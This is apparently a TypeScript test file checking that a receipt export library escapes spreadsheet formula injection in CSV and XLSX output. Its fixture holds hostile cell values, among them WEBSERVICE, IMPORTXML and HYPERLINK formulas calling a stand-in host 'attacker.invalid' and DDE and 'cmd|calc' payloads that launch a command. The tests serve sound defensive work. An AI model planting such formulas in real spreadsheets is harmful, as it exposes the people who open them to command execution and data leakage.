import ExcelJS from 'exceljs';

import { generateReceiptCSVBlob, generateReceiptExcel } from '@/lib/export-excel';

const maliciousReceipt = {
  id: '=HYPERLINK("https://attacker.invalid","open")',
  calcId: '@SUM(1+1)',
  inputs: {
    '=cmd|calc!A0': '+SUM(1,2)',
    'quoted "label"': 'line one\nline two',
  },
  steps: [
    {
      step: 1,
      title: '-2+3',
      formula: '=1+1',
      value: 2,
      unit: '@unit',
      standardRef: '+external',
    },
  ],
  result: {
    value: '=WEBSERVICE("https://attacker.invalid")',
    unit: '+unit',
    judgment: '@unsafe',
  },
  appliedStandard: '=IMPORTXML("https://attacker.invalid","//x")',
  receiptHash: '-1+2',
  calculatedAt: '2026-07-20T00:00:00.000Z',
  disclaimerText: '=DDE("cmd","/C calc",0)',
  warnings: ['\t=HYPERLINK("https://attacker.invalid")'],
  recommendations: ['@external'],
};

describe('spreadsheet export security', () => {
  it('quotes CSV fields and neutralizes formula-like user text', async () => {
    const blob = await generateReceiptCSVBlob(maliciousReceipt);
    const csv = await blob.text();

    expect(csv).toContain('"\'=cmd|calc!A0"');
    expect(csv).toContain('"\'+SUM(1,2)"');
    expect(csv).toContain('"quoted ""label"""');
    expect(csv).toContain('"line one\nline two"');
    expect(csv).toContain('"\'-2+3"');
    expect(csv).toContain('"\'=WEBSERVICE(""https://attacker.invalid"")"');
    expect(csv).not.toMatch(/(?:^|,)"?[\t\r ]*[=+@]/m);
  });

  it('stores untrusted XLSX text as neutralized strings, not formulas', async () => {
    const blob = await generateReceiptExcel(maliciousReceipt);
    const workbook = new ExcelJS.Workbook();
    await workbook.xlsx.load(await blob.arrayBuffer());

    const values: unknown[] = [];
    workbook.eachSheet((sheet) => {
      sheet.eachRow((row) => {
        row.eachCell((cell) => values.push(cell.value));
      });
    });

    expect(values).toContain("'=cmd|calc!A0");
    expect(values).toContain("'+SUM(1,2)");
    expect(values).toContain("'=1+1");
    expect(values).toContain("'=WEBSERVICE(\"https://attacker.invalid\")");
    expect(values).not.toContainEqual(expect.objectContaining({ formula: expect.any(String) }));
  });
});
